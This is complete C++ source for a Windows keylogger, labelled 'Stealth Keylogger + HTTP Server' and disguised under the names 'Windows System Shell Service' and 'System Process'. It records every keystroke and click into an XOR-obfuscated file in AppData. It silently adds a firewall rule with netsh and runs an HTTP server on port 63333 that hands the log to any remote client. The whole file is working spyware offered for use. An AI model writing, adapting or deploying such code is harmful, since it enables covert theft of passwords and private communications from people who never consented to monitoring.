// Windows System Shell Service.cpp
// Stealth Keylogger + HTTP Server
// --------------------------------------------------------------

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>      // MUST BE FIRST
#include <ws2tcpip.h>
#include <shlobj.h>        // BEFORE windows.h .... fixes SHGetFolderPathA & CSIDL_APPDATA
#include <windows.h>
#include <iphlpapi.h>
#include <algorithm>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <cctype>
#include <string>
#include <unordered_map>
#include <sstream>
#include <iomanip>
#include <direct.h>

// ====================== CONFIG =============================
const BYTE XOR_KEY = 0xAB;
const int EXIT_HOTKEY_MOD = MOD_CONTROL | MOD_ALT;
const int EXIT_HOTKEY_VK = 'Q';
const DWORD DEBOUNCE_MS = 300;
const USHORT HTTP_PORT = 63333;
// ==============================================================

static FILE* g_logFile = nullptr;

// --------------------------------------------------------------
static void XorBuffer(BYTE* buf, size_t len, BYTE key) {
    for (size_t i = 0; i < len; ++i) buf[i] ^= key;
}

// --------------------------------------------------------------
static void Log(const char* payload) {
    static std::unordered_map<int, DWORD> lastPress;

    int vk = 0;
    if (strcmp(payload, "[CTRL]") == 0) vk = VK_CONTROL;
    else if (strcmp(payload, "[ALT]") == 0) vk = VK_MENU;
    else if (strcmp(payload, "[SHIFT]") == 0) vk = VK_SHIFT;
    else if (strcmp(payload, "[WIN]") == 0) vk = VK_LWIN;

    DWORD now = GetTickCount();
    if (vk && lastPress[vk] && (now - lastPress[vk] < DEBOUNCE_MS)) return;
    if (vk) lastPress[vk] = now;

    char ts[32];
    time_t t = time(nullptr);
    struct tm* tm = localtime(&t);
    strftime(ts, sizeof(ts), "[%Y-%m-%d %H:%M:%S] ", tm);

    char line[512];
    snprintf(line, sizeof(line), "%s%s\n", ts, payload);

    XorBuffer((BYTE*)line, strlen(line), XOR_KEY);
    fputs(line, g_logFile);
    fflush(g_logFile);
}

// --------------------------------------------------------------
static std::string GetAppDataPath() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path) == S_OK) {
        return std::string(path) + "\\CDT";
    }
    return "C:\\Temp";
}
// --------------------------------------------------------------
static std::string GetMacAddress() {
    ULONG bufLen = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &bufLen);
    if (bufLen == 0) return "00-00-00-00-00-00";

    IP_ADAPTER_ADDRESSES* p = (IP_ADAPTER_ADDRESSES*)malloc(bufLen);
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, p, &bufLen);

    std::ostringstream mac;
    for (IP_ADAPTER_ADDRESSES* cur = p; cur; cur = cur->Next) {
        if (cur->PhysicalAddressLength == 6 && cur->OperStatus == IfOperStatusUp) {
            for (DWORD i = 0; i < 6; ++i)
                mac << std::hex << std::setw(2) << std::setfill('0')
                    << (int)cur->PhysicalAddress[i] << (i < 5 ? "-" : "");
            break;
        }
    }
    free(p);
    std::string result = mac.str();
    std::replace(result.begin(), result.end(), ':', '-');
    return result.empty() ? "00-00-00-00-00-00" : result;
}
// --------------------------------------------------------------
static std::string GetLocalIP() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return "0.0.0.0";

    char host[256];
    if (gethostname(host, sizeof(host)) != 0) { WSACleanup(); return "0.0.0.0"; }

    struct addrinfo hints = {}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, nullptr, &hints, &res) != 0) { WSACleanup(); return "0.0.0.0"; }

    std::string ip = "0.0.0.0";
    for (struct addrinfo* ptr = res; ptr; ptr = ptr->ai_next) {
        sockaddr_in* sin = (sockaddr_in*)ptr->ai_addr;
        if (sin->sin_addr.s_addr != htonl(INADDR_LOOPBACK)) {
            ip = inet_ntoa(sin->sin_addr);
            break;
        }
    }
    freeaddrinfo(res);
    WSACleanup();
    return ip;
}

static std::string GetLogPath() {
    std::string dir = GetAppDataPath();
    _mkdir(dir.c_str());

    std::string mac = GetMacAddress();
    std::string ip = GetLocalIP();
    return dir + "\\" + mac + "_" + ip + ".enc";
}

// --------------------------------------------------------------
static void HandleKey(int vk) {
    switch (vk) {
        case VK_BACK:     Log("[BACKSPACE]"); break;
        case VK_RETURN:   Log("[ENTER]");     break;
        case VK_SPACE:    Log(" ");           break;
        case VK_TAB:      Log("[TAB]");       break;
        case VK_SHIFT:    Log("[SHIFT]");     break;
        case VK_LCONTROL:
        case VK_RCONTROL: Log("[CTRL]");      break;
        case VK_LMENU:
        case VK_RMENU:    Log("[ALT]");       break;
        case VK_LWIN:
        case VK_RWIN:     Log("[WIN]");       break;
        case VK_ESCAPE:   Log("[ESC]");       break;
        case VK_CAPITAL:  Log("[CAPSLOCK]");  break;
        case VK_DELETE:   Log("[DELETE]");    break;
        case VK_INSERT:   Log("[INSERT]");    break;
        case VK_HOME:     Log("[HOME]");      break;
        case VK_END:      Log("[END]");       break;
        case VK_PRIOR:    Log("[PGUP]");      break;
        case VK_NEXT:     Log("[PGDN]");      break;
        case VK_LEFT:     Log("[LEFT]");      break;
        case VK_RIGHT:    Log("[RIGHT]");     break;
        case VK_UP:       Log("[UP]");        break;
        case VK_DOWN:     Log("[DOWN]");      break;
        case VK_LBUTTON:  Log("[LCLICK]");    break;
        case VK_RBUTTON:  Log("[RCLICK]");    break;
        case VK_MBUTTON:  Log("[MCLICK]");    break;

#define LOG_F(n) case VK_F##n: Log("[F"#n"]"); break;
        LOG_F(1); LOG_F(2); LOG_F(3); LOG_F(4); LOG_F(5); LOG_F(6);
        LOG_F(7); LOG_F(8); LOG_F(9); LOG_F(10); LOG_F(11); LOG_F(12);
#undef LOG_F

        default:
            if (vk >= 32 && vk <= 126) {
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps  = (GetKeyState(VK_CAPITAL) & 1) != 0;
                char ch = (char)vk;

                if (isalpha(ch)) {
                    ch = (shift ^ caps) ? toupper(ch) : tolower(ch);
                } else if (shift) {
                    const char* map = "!@#$%^&*()_+:{}|~<>?";
                    const char* src = "1234567890-=[]\\;',./";
                    const char* p = strchr(src, ch);
                    if (p) ch = map[p - src];
                }

                char buf[2] = { ch, 0 };
                Log(buf);
            } else if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
                char num = '0' + (vk - VK_NUMPAD0);
                char buf[2] = { num, 0 };
                Log(buf);
            } else if (vk != 0x11 && vk != 0x12) {
                char buf[16];
                snprintf(buf, sizeof(buf), "[VK_%02X]", vk);
                Log(buf);
            }
            break;
    }
}
// --------------------------------------------------------------
static bool CheckExitHotkey() {
    return (GetAsyncKeyState(EXIT_HOTKEY_VK) & 0x8000) &&
           (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
           (GetAsyncKeyState(VK_MENU) & 0x8000);
}

// --------------------------------------------------------------
// Tiny HTTP Server Thread
static DWORD WINAPI HttpServerThread(LPVOID) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;

    SOCKET srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (srv == INVALID_SOCKET) return 1;

    // Reuse address (in case of crash)
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;  // 0.0.0.0 on ALL INTERFACES

    if (bind(srv, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(srv);
        WSACleanup();
        return 1;
    }

    if (listen(srv, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(srv);
        WSACleanup();
        return 1;
    }

    Log("[HTTP] Server started on 0.0.0.0:63333");

    std::string logPath = GetLogPath();
    char recvBuf[1024];

    while (true) {
        sockaddr_in clientAddr;
        int clientLen = sizeof(clientAddr);
        SOCKET client = accept(srv, (sockaddr*)&clientAddr, &clientLen);
        if (client == INVALID_SOCKET) continue;

        // Get client IP
        char clientIP[32];
        strcpy_s(clientIP, inet_ntoa(clientAddr.sin_addr));
        char logMsg[128];
        snprintf(logMsg, sizeof(logMsg), "[HTTP] Client: %s", clientIP);
        Log(logMsg);

        // Read request (ignore content)
        recv(client, recvBuf, sizeof(recvBuf), 0);

        // Open log file
        FILE* f = fopen(logPath.c_str(), "rb");
        if (!f) {
            const char* resp = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
            send(client, resp, (int)strlen(resp), 0);
            closesocket(client);
            continue;
        }

        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);

        char* data = (char*)malloc(size);
        fread(data, 1, size, f);
        fclose(f);

        // Build headers
        std::ostringstream hdr;
        hdr << "HTTP/1.1 200 OK\r\n"
            << "Content-Type: application/octet-stream\r\n"
            << "Content-Length: " << size << "\r\n"
            << "Content-Disposition: attachment; filename=\"log.enc\"\r\n"
            << "Connection: close\r\n"
            << "\r\n";

        std::string headers = hdr.str();

        // Send headers + file
        send(client, headers.c_str(), (int)headers.size(), 0);
        send(client, data, (int)size, 0);

        free(data);
        closesocket(client);
    }

    closesocket(srv);
    WSACleanup();
    return 0;
}
// --------------------------------------------------------------
// MAIN ENTRY POINT – WinMain for -mwindows (no console)
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    FreeConsole();
    SetConsoleTitleA("System Process");
    system("netsh advfirewall firewall add rule name=\"CDT HTTP\" dir=in action=allow protocol=TCP localport=63333 >nul 2>&1");
    std::string logPath = GetLogPath();
    g_logFile = fopen(logPath.c_str(), "ab");
    if (!g_logFile) {
        MessageBoxA(nullptr, ("Failed to open log file:\n" + logPath).c_str(),
                    "CDT Keylogger", MB_ICONERROR);
        return 1;
    }
    setbuf(g_logFile, NULL);
    Log("=== CDT KEYLOGGER STARTED ===");

    CreateThread(nullptr, 0, HttpServerThread, nullptr, 0, nullptr);
    RegisterHotKey(nullptr, 1, EXIT_HOTKEY_MOD, EXIT_HOTKEY_VK);

    MSG msg;
    while (true) {
        if (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_HOTKEY && msg.wParam == 1) {
                Log("=== STOPPED BY HOTKEY ===");
                break;
            }
            DispatchMessage(&msg);
        }

        if (CheckExitHotkey()) {
            Log("=== STOPPED BY MANUAL CHECK ===");
            break;
        }

        Sleep(5);

        for (int vk = 8; vk <= 255; ++vk) {
            if (GetAsyncKeyState(vk) == -32767) {
                HandleKey(vk);
            }
        }
    }

    if (g_logFile) {
        fflush(g_logFile);
        fclose(g_logFile);
    }
    UnregisterHotKey(nullptr, 1);
    return 0;
}